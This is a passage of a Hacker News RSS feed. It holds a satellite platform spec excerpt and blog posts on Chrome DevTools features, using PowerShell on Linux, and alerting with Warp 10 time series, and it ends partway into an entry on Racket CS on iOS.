<li>For exceptional data processing requirements, the onboard computer can be upgraded to an OrbAstro <a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-40 </a> OBC for an additional £5,000 or <a href="https://orbastro.com/obc" target="_blank" rel="noopener noreferrer"> Telos-45 </a> for an additional £20,000. This gives two cores for payload operations on which customers can have their own software either Bare Metal or Linux. No further payload volume in consumed with this change, however power available for the payload will be reduced depending on how heavily this OBC is utilised.</li>
</ul>
</li>
</ul>
<p><img loading="lazy" width="525" height="346" alt="" src="https://orbastro.com/wp-content/uploads/2020/11/3u-obc-1024x674.png"></p>
</div>
</div>
</div>
</div>
<div id="offset_864_2">

<div id="collapse_864_2" role="tabwpsm_panel" aria-labelledby="heading_864_2">
<div>
<div id="#wpsm_acc_desc_864_2">
<ul>
<li>
<ul>
<li>The platform hosts an optical communications system for data relay through the Guardian Network. Subscription packages vary, but 500MB/day uplink/downlink with up to 24 links per day is the baseline. Service available from mid-2023.</li>
<li>As a back-up, and until the Guardian Network becomes operational, the platform contains an S-band transceiver and antenna with a 50Mb/s typical data rate at 1,000km. All Guardian Network ground stations are capable of supporting S-band, X-band, and Ka-band links. Three associated ground stations will be operational by late 2021.</li>
<li>The S-band transceiver can be complimented with a Ka-band transmitter and antenna for an additional £5,000. The transmitter typically provides an additional 200Mb/s downlink at 1,000km range. But power available to the payload is reduced depending on utilisation, and 0.15U payload volume is consumed. All Guardian Network ground stations are capable of supporting S-band, X-band, and Ka-band. Three associated ground stations will be operational by late 2021.</li>
</ul>
</li>
</ul>
<p><img loading="lazy" width="525" height="376" alt="" src="https://orbastro.com/wp-content/uploads/2020/11/3u-comms-1024x733.png"></p>
</div>
</div>
</div>
</div>
<div id="offset_864_3">

<div id="collapse_864_3" role="tabwpsm_panel" aria-labelledby="heading_864_3">
<div>
<div id="#wpsm_acc_desc_864_3">
<ul>
<li>
<ul>
<li>The ADCS is based on an array of reaction wheels, magnetorquers, dual star-tracker cameras, Earth and Sun cameras, magnetometers, gyroscopes, and GPS unit, with a relatively comprehensive level of redundancy built in.</li>
<li>It provides highly accurate pointing control authority (&lt;0.1deg/s) and pointing knowledge (&lt;0.01deg/s) in both Solar and Eclipse phases.</li>
<li>High precision dual star-tracker for redundancy.</li>
<li>Dual redundant 3-axis magnetorquers.</li>
<li>It provides extremely high torque authority (40mNm) and momentum storage capacity (38mNms), typically an order of magnitude higher than what is conventionally available for 3U satellites. This ability for agile steering/pointing enables the customer to increase the amount of useful data collected by their payload (i.e. by jumping between points of interest through the orbit rather than say maintaining a fixed NADIR-pointing angle). The overhead for this type of target-tracking operation is much compressed when coupled to the Guardian Network autonomous mission operations service.</li>
</ul>
</li>
</ul>
<p><img loading="lazy" width="525" height="328" alt="" src="https://orbastro.com/wp-content/uploads/2020/11/3u-adcs-1024x640.png"></p>
</div>
</div>
</div>
</div>
<div id="offset_864_4">

<div id="collapse_864_4" role="tabwpsm_panel" aria-labelledby="heading_864_4">
<div>
<div id="#wpsm_acc_desc_864_4">
<ul>
<li>
<ul>
<li>An electric propulsion system is contained within the “tuna can” of the platform. It provides a maximum thrust of 116μN and a delta-V of 0.46km/s (baselining a 5kg …</li></ul></li></ul></div></div></div></div></div></div></div></div></div></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://orbastro.com/satellites/orb-3/">https://orbastro.com/satellites/orb-3/</a></em></p>]]>
            </description>
            <link>https://orbastro.com/satellites/orb-3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833477</guid>
            <pubDate>Tue, 19 Jan 2021 14:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Favourite Chrome Devtool Features]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25833230">thread link</a>) | @quasimodal
<br/>
January 19, 2021 | https://emergent.systems/posts/devtools/ | <a href="https://web.archive.org/web/*/https://emergent.systems/posts/devtools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            <p>We have a lot of tools at our disposal when programming for the web. Shells, editors,
IDEs, emulators, simulators, browsers and their associated dev tools, compilers,
version control systems like GIT, build tools like webpack, the list goes on and on.</p>
<p>A common pitfall is to learn just enough of these tools to get by. We can end up
using a shallow subset of these tools features like proverbial hammers rendering
many problems nails. This can make day to day development <strong>alot harder</strong> than
it needs to be.</p>
<p>You will spend a lot of time with these tools during your programming career.
It’s worth getting to know them well. In this post I’ll share some features of
Chrome DevTools you may not be aware of that I’ve found to be most useful in day
to day hacking on thick client apps.</p>
<p>So with that said grab that flux capacitor. Where we’re going we don’t need
console.log!</p>
<h2>Console Utilities</h2>
<p>Most folks are familiar with accessing browser globals <code>window</code> and <code>document</code>
from the console pane but you might not be aware Chrome DevTools ships with a
bunch of console utilities alongside these. Here’s a couple worth knowing.</p>
<h3>$0 and friends</h3>
<p>Say we want to obtain a reference to a particular DOM Element in the console so
we can interact with it. There are a few common ways people tend to do this:</p>
<ul>
<li>use a DOM method from the console like <code>document.querySelector(selector)</code></li>
<li>Use <code>$(selector)</code> which is an alias for <code>document.querySelector</code>.</li>
<li>Right click on an element from the Elements pane and select “store as
global variable”.</li>
</ul>
<p>There is another way that proves a lot more useful particularly when your
debugging concerns multiple elements. Meet <code>$0</code> and it’s friends <code>$1</code>, <code>$2</code>, <code>$3</code>,
<code>$4</code>. These are special references in the console that point to the last
5 elements selected in the Elements Panel.</p>
<p>Right click a webpage and choose “Inspect Element”. Now navigate to
the console tab of dev tools drawer and type <code>$0</code> and hit Enter.</p>
<p>You should see the element you selected logged to the console.</p>
<p><img src="https://emergent.systems/static/img/$0.png" alt="$0" loading="lazy"></p>
<h3>The events must flow: monitorEvents</h3>
<p>Have you ever wanted to be able to see what events a particular DOM Element is
recieving as you interact with a web page?</p>
<p>Maybe you’ve attached some event handlers but things aren’t being triggered as
you expect so you need a closer look. Sure you could throw in a <code>console.log</code>
into the event listener code but that just works for one event handler and
it also involves adding and removing code in order to debug things. Laborious!</p>
<p>The <code>monitorEvents</code> API of chrome dev tools allows you to see all events that
are recieved by any DOM Element as you interact with the page without adding any
additional app code. Let’s try it out.</p>
<p>Open the Elements pane and select the element you wish to monitor for events.</p>
<p>Now we are going to use our special <code>$0</code> reference we learned earlier to pass a
reference to the DOM Element we want to observe. Go to the console and type
<code>monitorEvents($0)</code>.</p>
<p>Calling <code>monitorEvents</code> with a single argument will monitor <em>all</em> events for
that Element. We can also specify the exact event we want to monitor by
supplying a second argument: <code>monitorEvents($0, 'click')</code>.</p>
<p>Hit Enter to invoke the <code>monitorEvents</code> function and then interact with the DOM
Element you chose to monitor in the web page. You should now see a stream of
events received by the Element you are monitoring logged to the console.</p>
<p><img src="https://emergent.systems/static/img/monitor-events.png" alt="Monitor Events" loading="lazy"></p>
<h2>The Command Menu</h2>
<p>The command menu is a faster way to navigate the DevTools UI and accomplish
many common tasks without having to leave your keyboard.</p>
<p>With DevTools open, you can open the command menu on Mac by pressing
<code>Command+Shift+P</code>.</p>
<p>You should now see the command menu:</p>
<p><img src="https://emergent.systems/static/img/command-menu.png" alt="Command Menu" loading="lazy"></p>
<p>The available commands are segmented in to various categories like Network,
Debugger, Rendering etc. and you can leverage the menu fuzzy search to find the
one you want quicker.</p>
<p>Take a moment to scroll through the list and get an idea of the commands
available.</p>
<h2>The DevTools Drawer</h2>
<p>DevTools provides access to it’s 9 main panes (Elements, Console, Sources etc.)
via tabs at the top of the DevTools window.</p>
<p>You’d be forgiven for not knowing that there is an additional set of 19 panes
hidden away in what’s called the DevTools <em>Drawer</em>. You can find them by
clicking the three dots on the right of the main DevTools Tab Bar and
selecting “More Tools” from the menu:</p>
<p><img src="https://emergent.systems/static/img/drawer-menu.png" alt="Drawer" loading="lazy"></p>
<p>Let’s take a closer look at a couple of my favourite Drawer panes.</p>
<h3>The Coverage Pane: Optimising Performance At Build-time.</h3>
<p>The code coverage pane allows you to analyze how much CSS and JS code was
loaded versus how much was <em>used</em>. This helps to identify possible <a href="https://webpack.js.org/guides/code-splitting/">code splitting</a>
opportunities in order to optimise our build and only load stuff a
user actually needs at a given time.</p>

<p>Lets perform a quick analysis. Navigate to any webpage, open the DevTools,
launch the Command Menu and type “coverage”. You should see a “Show Coverage”
command:</p>
<p><img src="https://emergent.systems/static/img/coverage-drawer-command.png" alt="Coverage Drawer Command" loading="lazy"></p>
<p>Hit enter and you should see a new drawer tab labelled “Coverage” and its
corresponding pane should be visible:</p>
<p><img src="https://emergent.systems/static/img/coverage-drawer.png" alt="Coverage Drawer" loading="lazy"></p>
<p>Click the reload button. This will instrument the CSS and JS code on the page
and reload it producing a coverage report:</p>
<p><img src="https://emergent.systems/static/img/coverage-report.png" alt="Coverage Report" loading="lazy"></p>
<p>leverage <a href="https://developers.google.com/web/fundamentals/performance/rendering">network
throttling</a>
to simulate differing network conditions.</p>
<h3>Performance Monitor: Optimising Performance At Runtime.</h3>
<p>In terms of CPU/RAM, it’s safe to say developers are generally asymmetrically
much better off than the average user of apps being built with high end development
machines.</p>
<p>Don’t be surprised if you get hit with a bug report out of the blue one day
complaining that your site is slow. Maybe it’s a memory leak. Maybe you are triggering
too many reflows and the CPU is getting maxed out. <strong>Web perf is hard</strong> and
there are many possible causes for performance issues. For that reason, it’s
useful to get an initial view at 50,000 ft. so that you can appropriately narrow
the scope of your debugging efforts.</p>
<p>The Performance Monitor drawer pane allows us to easily see some high level
runtime performance metrics like CPU usage, JS Heap Allocations and more.</p>
<p>Again the the easiest way to bring up the performance monitor is via the
Commmand Menu. Open it and type “Show Performance Monitor” and hit Enter. You
should now see a new Drawer pane tracking key perf metrics over time:</p>
<p><img src="https://emergent.systems/static/img/performance-monitor.png" alt="Performance Monitor" loading="lazy"></p>
<p>leverage <a href="https://developers.google.com/web/updates/2017/07/devtools-release-notes#throttling">cpu throttling</a>
to see how your site performs on less powerful devices.</p>
<h3>Script Blackboxing</h3>
<p>More often that not, when working with the JS debugger you are more interested
in your own application code rather than any 3rd party code that is being
executed.</p>
<p><em>Script Blackboxing</em> is way to ignore specific files while debugging. When a
script is blackboxed, it won’t appear in the Call Stack pane and even better,
when stepping through code, the blackboxed scripts will be skipped.</p>
<p>The best way to blackbox scripts is via the Settings pane. Open DevTools and
click the cog on the far right to open the settings and select “blackbox”. Here
you can add a pattern to blackbox any scripts you wish to ignore when debugging!</p>
<p><img src="https://emergent.systems/static/img/script-blackboxing.png" alt="Script Blackboxing" loading="lazy"></p>
<h3>Local Overrides</h3>
<p>Local overrides are a way to persist changes you make to your code via
DevTools and have them persist across page reloads. This feature is particularly
handy when collaborating with designers to make UI tweaks on the fly.</p>
<p>To enable local overrides, open the DevTools and select the Sources tab. Select
Overrides from the sub menu and click “Select folder for overrides” to choose a
directory where DevTools can persist your changes.</p>
<p><img src="https://emergent.systems/static/img/overrides.png" alt="Overrides" loading="lazy"></p>
<p>With overrides enabled, DevTools will now serve any local modified files rather
than the original resources.</p>
<p>Give it a shot. Change a CSS property via the Styles sub-menu of the Elements pane
and refresh the page. You should see your change persist across page reloads.</p>
<p>Chrome also gives you a way to easily track these changes. Open the Command Menu
and search for “Changes” hit enter on the “Show Changes” Drawer menu item.</p>
<p><img src="https://emergent.systems/static/img/changes.png" alt="Overrides" loading="lazy"></p>
<p>Hopefully some of these DevTool features are new to you. If so I encourage you
to try incorporating them in to your day to day development workflow. It will
take time to build some new muscle memories but sometimes you gotta go slow
to go fast!</p>

        </article></div>]]>
            </description>
            <link>https://emergent.systems/posts/devtools/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833230</guid>
            <pubDate>Tue, 19 Jan 2021 13:31:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux and Powershell]]>
            </title>
            <description>
<![CDATA[
Score 71 | Comments 114 (<a href="https://news.ycombinator.com/item?id=25833122">thread link</a>) | @johnjackjames
<br/>
January 19, 2021 | https://matteoguadrini.github.io/posts/linux-and-powershell/ | <a href="https://web.archive.org/web/*/https://matteoguadrini.github.io/posts/linux-and-powershell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <section>
    <p><img src="https://www.lffl.org/wp-content/uploads/2018/07/microsoft-powershell.jpg" alt="Linux and powershell"></p>
<h2 id="what-powershell">What powershell?</h2>
<p><strong>Powershell</strong> is an object-based shell born in Microsoft in 2006, made open source 10 years later. It is characterized by commands, called <em>cmdlets</em>, which respect a certain pattern. An example cmdlet is as follows:</p>
<div><pre><code data-lang="powershell"><span>Get-ChildItem</span> <span>-Path</span> <span>value</span>
</code></pre></div><p>The pattern in question is <code>Verb-Noun -Option argument</code>, where <em>Verb</em> is a list of <a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.1">verbs</a>. <em>Noun</em> is a description of what impacts the command verb. The <em>Option</em> instead are preceded by a dash and its name; to follow, all the <em>arguments</em> of the option.</p>
<p>This pattern guarantees two things:</p>
<ol>
<li><strong>readability</strong>: if you read the command, you know what it does. For example, the previous command shows that: I get all the child objects of a given path (files and folders).</li>
<li><strong>standard</strong>: following such a strict standard, it is possible to introduce various new commands already knowing (thanks to readability) what they do.</li>
</ol>
<h2 id="why-powershell-on-linux">Why powershell on Linux?</h2>
<p>Linux has a great scripting tool: <em>bash</em> . Bash is a shell that provides us with a very simple but effective scripting language to write various automatisms. The only problem with bash is that any output is a string and must be treated as such; therefore, we use the same task we took as an example in powershell; we list the files and directories in a given path:</p>
<p>The output produced by this command is a string, so if we need to search for something we have to pass the output as the input of another command, through the pipeline.</p>
<div><pre><code data-lang="bash">ls -l path <span>|</span> grep whatever
</code></pre></div><p>Each powershell output is an object. Each object has its own properties that can be used through other cmdlets. For example, the above command will output a <strong>System.Array</strong> type. This type of object can be used by an iterator (such as the <code>for</code> loop) or by a filter cmdlet, such as <code>Where-Object</code>.</p>
<p>Powershell is an excellent tool for a linux distribution because it offers a series of commands useful for developing tools and automatisms that are very difficult to implement with simple strings.</p>
<h2 id="installation-on-linux">Installation on Linux</h2>
<p>Depending on your distribution, installing powershell on Linux is a fairly simple task. If you have Debian or Ubuntu, we can install it thanks to <em>snapd</em> , like this:</p>
<pre><code data-lang="console">$ sudo apt install snapd
$ snap install powershell
</code></pre><p>Instead on Red Hat based distributions, run the following commands:</p>
<pre><code data-lang="console">$ curl https://packages.microsoft.com/config/rhel/7/prod.repo | sudo tee /etc/yum.repos.d/microsoft.repo
$ sudo yum install -y powershell
</code></pre><p>To activate powershell, just type <code>pwsh</code>.</p>
<h3 id="other-distribution">Other distribution</h3>
<p>For installation on other distributions refer to the official Microsoft <a href="https://docs.microsoft.com/it-it/powershell/scripting/install/installing-powershell-core-on-linux?view=powershell-7.1">installation page</a>.</p>
<h2 id="scripts-and-modules-automations">Scripts and modules: automations</h2>
<p>One of the advantages of powershell is that you can save commands and various code parts in script and module files.</p>
<h3 id="scripts">Scripts</h3>
<p>To create a script file, just write powershell to a file with the <em>.ps1</em> extension, and parse it to the <code>pwsh</code> interpreter.</p>
<div><pre><code data-lang="powershell"><span># file myscript.ps1</span>

<span># Get all file modified in the last 3 days</span>
<span>Get-ChildItem</span> <span>-Path</span> <span>path</span> <span>-Recurse</span> <span>|</span> <span>Where-Object</span> <span>{</span>
  <span>$_</span><span>.</span><span>LastWriteTime</span> <span>-gt</span> <span>(</span><span>Get-Date</span><span>).</span><span>AddDays</span><span>(-</span><span>3</span><span>)</span> 
<span>}</span>
</code></pre></div><p>We have created a script that tells us all files changed in the last 3 days. Fantastic. Now let’s call it from the command line: <code>pwsh myscript.ps1</code></p>
<h3 id="modules">Modules</h3>
<p>Not all tasks are sequential commands and not all tasks can be contained in a single powershell file. For this, we will use module to collect our functions.</p>
<p>Let’s take the script from earlier. Let’s turn it into a function and put it into a module. The module consists of a module file with the extension <code>.psm1</code> and a module manifest file with the extension<code> .psd1</code>. First, let’s create the module.</p>
<pre><code data-lang="console">$ mkdir mymodule
$ touch mymodule/mymodule.psm1
$ pwsh
PowerShell 7.1.1
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS &gt; New-ModuleManifest -Path mymodule/mymodule.psd1 -ModuleVersion "0.0.1" -Author "YourNameHere"
</code></pre><p>We have created the structure of the module. Now, let’s do a function called <code>Get-LastThreeDaysModifiedFiles</code> containing the above script.</p>
<div><pre><code data-lang="powershell"><span>#  mymodule/mymodule.psm1</span>

<span>New-Alias</span> <span>-Name</span> <span>"ls3"</span> <span>Get-LastThreeDaysModifiedFiles</span>

<span>function</span> <span>Get-LastThreeDaysModifiedFiles</span><span>(</span><span>$Path</span><span>)</span> <span>{</span>
	<span>Get-ChildItem</span> <span>-Path</span> <span>$Path</span> <span>-Recurse</span> <span>|</span> <span>Where-Object</span> <span>{</span>
  		<span>$_</span><span>.</span><span>LastWriteTime</span> <span>-gt</span> <span>(</span><span>Get-Date</span><span>).</span><span>AddDays</span><span>(-</span><span>3</span><span>)</span> 
	<span>}</span>
<span>}</span>
</code></pre></div><p>Now edit our <em>mymodule.psd1</em> manifest file to add our function and alias for export. Find these two variables and edit them as follows:</p>
<div><pre><code data-lang="powershell"><span>#  mymodule/mymodule.psd1</span>
<span>$FunctionsToExport</span> <span>=</span> <span>@(</span><span>'Get-LastThreeDaysModifiedFiles'</span><span>)</span>
<span>$AliasesToExport</span> <span>=</span> <span>@(</span><span>'ls3'</span><span>)</span>
</code></pre></div><p>Now copy our module folder <code>mymodule</code> to the following path (for all users) <code>/usr/local/share/powershell/Modules</code> or <code>~/.local/share/powershell/Modules</code> (for your user), and open new powershell session:</p>
<div><pre><code data-lang="powershell"><span>PS </span><span>&gt;</span> <span>Get-LastThreeDaysModifiedFiles</span> <span>/</span><span>your</span><span>/</span><span>path</span><span>/</span>
<span>PS </span><span>&gt;</span> <span>ls3</span> <span>/</span><span>your</span><span>/</span><span>path</span><span>/</span>
</code></pre></div><h2 id="most-used-modules">Most used modules</h2>
<p>Of course it is possible to install modules from the <a href="https://www.powershellgallery.com/">official repository</a>, for various uses. On a Linux distribution, for example, the <a href="https://github.com/MatteoGuadrini/PSCouchDB">PSCouchDB module</a> is useful if you are an administrator of a no-sql database such as CouchDB.</p>
<div><pre><code data-lang="powershell"><span>PS </span><span>&gt;</span> <span>Install-Module</span> <span>-Name</span> <span>PSCouchDB</span>
<span>PS </span><span>&gt;</span> <span>Get-CouchDBDatabase</span>
</code></pre></div><p>This module simplifies the management of the databases and documents that define the characteristic structure of CouchDB. Alternatively, you can use <code>curl</code> but commands for complex tasks will be very long.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Finally, the goal of powershell in general is to facilitate the end user in scripting simple and complex tasks. Bash is a great tool for many tasks, but powershell can help solve some problems like filtering complex output, thanks to its object-oriented structure. Definitely a great choice for many activities.</p>

  </section>

  
</article></div>]]>
            </description>
            <link>https://matteoguadrini.github.io/posts/linux-and-powershell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833122</guid>
            <pubDate>Tue, 19 Jan 2021 13:15:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Have you ever looked at alerts as time series?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25833008">thread link</a>) | @giwi
<br/>
January 19, 2021 | https://blog.senx.io/alerts-are-real-time-series/ | <a href="https://web.archive.org/web/*/https://blog.senx.io/alerts-are-real-time-series/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Alerting is part of every monitoring solution, but have you ever looked at alerts as time series? By doing so an ocean of opportunities opens.</p><article>
      
<p>If you have ever set up a system for monitoring another system, you know comes a time when you can no longer stare at dashboards to ensure your system is behaving properly. <strong>That time is when you need to set up alerting so you can wake up your teammates in the middle of the night.</strong></p>



<p>Alerts come in different shapes, colors, and sizes. At SenX we strongly believe alerts are nothing more than time series with a notification mechanism to alter your sleep pattern. This post will walk you through alerts as we implement them on top of <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp&nbsp;10</a> to provide notifications about anomalies on industrial equipment or on IT infrastructure.</p>



<h2>Alerts as Time Series</h2>



<p>When you see the world as time series as we do, alerts appear as simple series of boolean values, with <code>true</code> meaning that the alerting condition is met and <code>false</code> or the absence of value that it is not. The meaning and complexity of the underlying condition are very flexible. It could be a simple threshold that is passed, a diversion from a previous trend, a detected anomaly, or any other thing you might think of.</p>



<p><strong>Treating alerts as time series means to periodically assess those conditions and, depending on the outcome, to insert boolean values in a set of time series.</strong> Those series will accrue values and give you a very good understanding of your systems.</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--1024x683.jpg" data-src="https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--1024x683.jpg" alt="History of alerts." width="812" height="542" data-srcset="https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--1024x683.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--2048x1366.jpg 2048w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--600x400.jpg 600w" data-sizes="(max-width: 812px) 100vw, 812px" srcset="https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--1024x683.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--300x200.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--768x512.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--1536x1024.jpg 1536w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--2048x1366.jpg 2048w, https://blog.senx.io/wp-content/uploads/2020/12/Screen-Shot-2020-12-15-at-10.10.33--600x400.jpg 600w"><figcaption>History of alerts.</figcaption></figure></div>



<p>The example above shows alert series related to a subsystem of a complex infrastructure over a period of several months.</p>



<h4>By just looking at those series you can see some very interesting things:</h4>



<p>At <strong>(1)</strong> you can see that many alerts are triggered at the same time. This means that some events impacted multiple systems, in the present case, network outages which caused several services to fail.</p>



<p>Then at <strong>(2)</strong> we see sporadic alerts, single values here and there, meaning that a condition was evaluated to <code>true</code> in an isolated manner. Most of the time these lonely alerts are due to metrics which arrive late and therefore lead to a condition evaluation based on data which does not reflect reality. If this type of alerts repeats itself too often it might be time to tune your metric collection system.</p>



<p>At <strong>(3)</strong> we see a high density of alerts, this happens when the root cause of the alerts is not dealt with rapidly, the condition keeps on evaluate to <code>true</code> and therefore values keep being added to the alert time series. If you see too many of those you might need to talk to your on-call team. They are not acting fast enough or the issues they faces were complex to resolve.</p>



<p>Finally, at <strong>(4)</strong>, you see three alerts which are triggered almost always at the same time, this either means that some of them are not useful or that a component has an impact on several, a little like in case<strong> (1)</strong>.</p>



<p><strong>Another benefit of treating alerts as time series is that you can easily test out new alerting conditions by running the condition on past metrics values and see how often alerts would be triggered.</strong> You could then assess if the new condition would have generated more or less alerts than the current one, and you could see if known incidents could have been detected earlier or not.</p>



<p><strong>You see, by treating alerts as time series you can learn a lot about the systems you supervise, and believe it or not, no notification was involved.</strong></p>



<h2>Alerts and notifications are two different beasts</h2>



<p>This is probably not what you thought up to now, but once you think about alerts as time series, notifications are simply here to warn you about the current situation, they are not the alerts themselves. <strong>So it is very important that when you design your supervision stack you clearly separate the notification step from the condition assessments which will lead to values in the alert time series.</strong></p>



<p>If notifications and alert conditions are too much entangled, you will have a hard time setting up efficient alerts. You will reason about the messenger (the email, page, or phone call you receive in the middle of the night) and not about the message itself.</p>



<p>Notifications should have a flexibility of their own, meaning that different target groups should decide to receive notifications, based on differing interpretations of the alert time series. Some teams might want to get paged when alerts outside their direct concern become too dense because they might indicate a worsening situation which may need their intervention, and ultimately may require they add new alerts themselves.</p>



<h2>Alerts in Warp&nbsp;10</h2>



<p>We have been using Warp&nbsp;10 for alerting for a long time. As a matter of fact, we monitor our own WarpCloud hosted platform using other instances of Warp&nbsp;10. And alerting and notifications are entirely handled in WarpScript. </p>



<p>So we will focus in the rest of this article on the alerting part done in Warp&nbsp;10. </p>



<p>For notifications, we will cover how to leverage external tools. The notification mechanisms available in Warp&nbsp;10 itself will be covered in another post.</p>



<h3>Configuration</h3>



<p>Over the years we have crafted macros which help us create and manage alerts. Those macros are now Open Source (AGPL) and available on SenX' <a href="https://warpfleet.senx.io/" target="_blank" rel="noreferrer noopener">WarpFleet</a> repository. This repository is configured by default in <a href="https://blog.senx.io/warp-10-release-2-7-0-flows/" target="_blank" rel="noreferrer noopener">fresh Warp&nbsp;10 installs</a> so you most probably won't have to add it.</p>



<p>In order for these macros to operate properly, they need to have access to a write and a read token. Those tokens should be <a href="https://blog.senx.io/thinking-in-warpscript-protecting-secrets/" target="_blank" rel="noreferrer noopener">defined in your configuration</a> under the following keys:</p>



<pre><code>alerting-write-token@senx/alerting = YOUR_WRITE_TOKEN
alerting-read-token@senx/alerting = YOUR_READ_TOKEN</code></pre>



<p>Once those configs have been added, restart your Warp&nbsp;10 instance. It will then be ready to use the alerting macros, and you can run the examples which appear in the rest of this post.</p>



<h3>How are alerts stored?</h3>



<p>The alerting macros will use the tokens provided in the configuration to store and read Geo Time Series (GTS) containing the alerts.</p>



<p>They manage two sets of GTS, the first one is <em>alerts</em> GTS which use <code>alert</code> as their class name. These series contain boolean values, actually, mainly <code>true</code> values, indicating whether an alert condition is met or not. The second set of series contains <em>events</em> series which keep track of the actions performed by the alerting macros. These series use the <code>alert.events</code> class name. Both sets of series use labels to identify alerts. </p>



<p>Those labels should contain elements which add context about the systems subject of the alerts (device id, rack, engine number, data center, ...) but not to the actual alert beyond its name. </p>



<p>For example, if you are triggering an alert because the equipment is experiencing extreme vibrations, you should not include the precise level of vibration in the labels. There are some macros to add that type of context to an alert.</p>



<h3>Triggering an alert</h3>



<p>You collect data points in various series which represent the state of systems you supervise, whether industrial or IT. Periodically you run macros which perform computations on those series to check various conditions. When a specific condition is met, you want to trigger an alert named <code>cond.1</code> to record this fact.</p>



<p>In your script, you would call the macro <code>@senx/alerting/trigger</code> with a map containing the labels you want to attach to the alert. Remember, those labels will end up as the labels of the series tracking the condition. </p>



<p>In the following example, we set three labels, <code>name</code> with the name of the alert, <code>equipment</code> with the id of the equipment experiencing this condition and <code>factory</code> with the reference of the factory where the equipment is located. These latter two information were probably retrieved from the labels of the series on which the computation was performed. The code to trigger the alert would then be:</p>



<pre><code>{
  'name' 'cond.1'
  'factory' 'factory.A'
  'equipment' '12B27-3'
} @senx/alerting/trigger</code></pre>



<p>That is all there is to it. This will create an entry in the series <code>alert.events{name=cond.1,factory=factory.A,equipment=12B27-3}</code> indicating a <code>TRIGGER</code> action was performed, and a <code>true</code> value will appear in series <code>alert{name=cond.1,factory=factory.A,equipment=12B27-3}</code>, both at the same current timestamp.</p>



<h3>Retrieving alerts</h3>



<p>The alerts created via <code>@senx/alerting/trigger</code> can be retrieved either via a regular <code><a href="https://warp10.io/doc/FETCH" target="_blank" rel="noreferrer noopener">FETCH</a></code> call with the appropriate token or more directly via the macro @senx/alerting/fetch. This macro expects a map of labels, an end timestamp, and a duration.</p>



<p>To retrieve all alerts related to<code> factory.A</code> during the last 24  hours simply execute the following:</p>



<pre><code>{
  'factory' 'factory.A'
}
NOW
24 h
@senx/alerting/fetch</code></pre>



<p>This will retrieve the data points of the last 24 hours for both the <code>alert</code> and <code>alert.events</code> series with label <code>factory</code> set to <code>factory.A</code>.</p>



<h3>Splitting alerts</h3>



<p>When alerts are triggered, it is rare that only a single value gets written to the <code>alert</code> series. Usually, the condition triggering the alert is met during several consecutive time intervals at which it is computed.</p>



<p>This leads to <em>blocks</em> of <code>true</code> values in the <code>alert</code> Geo Time Series, each block can be considered a separate occurrence of the actual alert, and it is therefore, useful to be able to isolate each of those occurrences.</p>



<p>This is done quite easily in WarpScript using the <code><a href="https://warp10.io/doc/TIMESPLIT" target="_blank" rel="noreferrer noopener">TIMESPLIT</a></code> function which will split a GTS in multiple sub GTS based on <em>quiet</em> periods where no values exist in the GTS. So for example, if you consider that blocks of values separated by more than 30 minutes are separate occurrences of the alert, you can use the following WarpScript code to isolate each occurrence:</p>



<pre><code>// We consider 'alert' series to be in variable $alerts
$alerts
30 m   // Consider 30 minute quiet periods
2      // Consider blocks with at least 2 values
'occ'  // Add a label 'occ' with the sequence number of each block
TIMESPLIT</code></pre>



<p>The result will be a list of lists, one for each alert, containing one Geo Time Series per occurrence of each alert.</p>



<p>T…</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.senx.io/alerts-are-real-time-series/">https://blog.senx.io/alerts-are-real-time-series/</a></em></p>]]>
            </description>
            <link>https://blog.senx.io/alerts-are-real-time-series/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833008</guid>
            <pubDate>Tue, 19 Jan 2021 12:57:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Racket CS on iOS]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25833004">thread link</a>) | @Bogdanp
<br/>
